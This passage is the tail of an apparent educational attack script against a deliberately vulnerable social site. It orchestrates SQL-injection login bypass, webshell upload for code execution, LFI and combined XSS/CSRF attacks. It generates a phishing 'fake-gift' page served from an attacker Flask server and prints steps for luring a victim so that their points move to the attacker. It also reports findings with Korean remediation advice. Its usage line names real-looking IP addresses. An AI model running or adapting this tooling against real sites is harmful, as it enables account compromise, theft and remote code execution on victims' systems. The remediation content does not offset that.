                        <div class="timeline-title">[{event['severity']}] {event['type']}</div>
                        <div class="timeline-desc">{event['description']}</div>
                    </div>
                </div>
"""
        
        html_content += """
            </div>
        </div>

        <div class="section">
            <h2>📋 종합 권고사항</h2>
            <div class="recommendations" style="border-left-color: #dc3545;">
                <h3>🚨 긴급 조치 필요 (24시간 이내)</h3>
                <ul>
                    <li>SQL Injection 취약점: Prepared Statement로 모든 쿼리 재작성</li>
                    <li>파일 업로드 취약점: 업로드 기능 일시 중단 또는 화이트리스트 검증 적용</li>
                    <li>CSRF 취약점: CSRF 토큰 즉시 적용 (profile.php, new_post.php 등)</li>
                </ul>
            </div>
            
            <div class="recommendations" style="border-left-color: #fd7e14; background: #fff3e0; margin-top: 20px;">
                <h3 style="color: #e65100;">⚠️ 우선순위 높음 (1주일 이내)</h3>
                <ul style="color: #e65100;">
                    <li>LFI 취약점: 파일 경로 검증 로직 강화</li>
                    <li>XSS 취약점: 모든 사용자 입력 출력 시 이스케이프 처리</li>
                    <li>세션 관리: HttpOnly, Secure 플래그 설정</li>
                    <li>에러 메시지: 상세 정보 노출 제거</li>
                </ul>
            </div>

            <div class="recommendations" style="border-left-color: #2196f3; background: #e3f2fd; margin-top: 20px;">
                <h3 style="color: #1565c0;">💡 장기 개선 사항</h3>
                <ul style="color: #1565c0;">
                    <li>웹 애플리케이션 방화벽(WAF) 도입</li>
                    <li>보안 코드 리뷰 프로세스 수립</li>
                    <li>정기적인 보안 진단 및 침투 테스트 실시</li>
                    <li>개발자 보안 교육 프로그램 운영</li>
                    <li>보안 로깅 및 모니터링 체계 구축</li>
                </ul>
            </div>
        </div>

        <div class="footer">
            <p>본 리포트는 교육 목적으로 생성되었습니다.</p>
            <p>VulnerableSNS Security Assessment Tool v1.0</p>
            <p>© 2024 Security Research Team</p>
        </div>
    </div>
</body>
</html>
"""
        
        # HTML 파일 저장
        report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"\n[+] HTML Report saved: {report_filename}")
        return report_filename

    def generate_json_report(self):
        """JSON 리포트 생성"""
        report = {
            'metadata': {
                'target': self.base_url,
                'attacker_server': self.attacker_server,
                'start_time': self.start_time.strftime('%Y-%m-%d %H:%M:%S'),
                'end_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'duration_seconds': (datetime.now() - self.start_time).seconds,
                'attacker_user_id': self.attacker_user_id,
                'tool_version': '1.0'
            },
            'summary': {
                'total_vulnerabilities': sum(len(v) for v in self.vulnerabilities.values()),
                'critical_count': sum(1 for vuln_list in self.vulnerabilities.values() 
                                    for vuln in vuln_list 
                                    if 'cvss_score' in vuln and vuln['cvss_score'] >= 9.0),
                'high_count': sum(1 for vuln_list in self.vulnerabilities.values() 
                                for vuln in vuln_list 
                                if 'cvss_score' in vuln and 7.0 <= vuln['cvss_score'] < 9.0),
                'vulnerability_breakdown': {
                    'sql_injection': len(self.vulnerabilities['sql_injection']),
                    'file_upload': len(self.vulnerabilities['file_upload']),
                    'lfi': len(self.vulnerabilities['lfi']),
                    'xss': len(self.vulnerabilities['xss']),
                    'csrf': len(self.vulnerabilities['csrf'])
                }
            },
            'vulnerabilities': self.vulnerabilities,
            'attack_timeline': self.attack_timeline,
            'artifacts': {
                'uploaded_webshell': self.uploaded_webshell,
                'fake_gift_page': 'fake-gift.html'
            }
        }
        
        report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"[+] JSON Report saved: {report_filename}")
        return report_filename
    
    def run_assessment(self):
        """전체 평가 실행"""
        print("\n" + "="*60)
        print("Vulnerable SNS - Security Assessment")
        print("="*60)
        print(f"Target: {self.base_url}")
        print(f"Attacker Server: {self.attacker_server}")
        print("="*60)
        
        self.log_event('SCAN_START', f'Security assessment started on {self.base_url}', 'INFO')
        
        # 1. SQL Injection
        time.sleep(1)
        self.test_sql_injection_login()
        
        if not self.logged_in:
            print("\n[-] Login failed. Cannot continue.")
            self.log_event('SCAN_FAILED', 'Unable to gain access to the system', 'ERROR')
            return
        
        # 2. File Upload
        time.sleep(1)
        self.test_file_upload_rce()
        
        # 3. LFI
        time.sleep(1)
        self.test_lfi()
        
        # 4. XSS + CSRF Combined
        time.sleep(1)
        self.test_xss_csrf_combined()
        
        # 5. fake-gift 페이지 생성
        self.generate_fake_gift_page()
        
        self.log_event('SCAN_COMPLETE', f'Security assessment completed. {sum(len(v) for v in self.vulnerabilities.values())} vulnerabilities found', 'INFO')
        
        # 6. 리포트 생성
        self.print_section("Generating Reports")
        html_report = self.generate_html_report()
        json_report = self.generate_json_report()
        
        # 콘솔 요약 출력
        self.print_report()
        
        print(f"\n[+] Assessment complete!")
        print(f"[+] HTML Report: {html_report}")
        print(f"[+] JSON Report: {json_report}")
        print(f"[+] fake-gift.html: Ready for deployment")
    
    def print_report(self):
        """콘솔 요약 출력"""
        self.print_section("Assessment Summary")
        
        total = sum(len(v) for v in self.vulnerabilities.values())
        print(f"\n✓ Total vulnerabilities found: {total}\n")
        
        for vuln_type, vulns in self.vulnerabilities.items():
            if vulns:
                print(f"\n[{vuln_type.upper()}] - {len(vulns)} found")
                print("-" * 60)
                for i, vuln in enumerate(vulns, 1):
                    print(f"{i}. {vuln.get('description', vuln.get('type', 'N/A'))}")
                    if 'cvss_score' in vuln:
                        print(f"   CVSS Score: {vuln['cvss_score']}")
                    if 'impact' in vuln:
                        print(f"   Impact: {vuln['impact']}")
                    print()
        
        print(f"\n" + "="*60)
        print("CSRF Attack Setup Instructions")
        print("="*60)
        print(f"[*] Next steps:")
        print(f"    1. Start Flask server: python3 attacker_server.py")
        print(f"    2. Verify fake-gift.html is accessible: {self.attacker_server}/fake-gift")
        print(f"    3. Victim clicks malicious post link")
        print(f"    4. Monitor dashboard: {self.attacker_server}/")
        print(f"    5. Check attack logs in real-time")
        print(f"\n[*] Expected results:")
        print(f"    - Victim's points transferred to attacker (ID: {self.attacker_user_id})")
        print(f"    - Victim's profile modified")
        print(f"    - All actions logged to Flask server")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python3 auto_fixed.py <target_url> <attacker_server>")
        print("Example: python3 auto_fixed.py http://18.179.53.107/vulnerable-sns/www http://13.158.67.78:5000")
        sys.exit(1)
    
    target = sys.argv[1]
    attacker_server = sys.argv[2]
    
    attacker = VulnerableSNSAttacker(target, attacker_server)
    attacker.run_assessment()
    
    print("\n" + "="*60)
    print("✅ Assessment completed successfully!")
    print(f"📊 Check the generated HTML report for detailed findings")
    print(f"🎯 Monitor attacks at: {attacker_server}")
    print("="*60)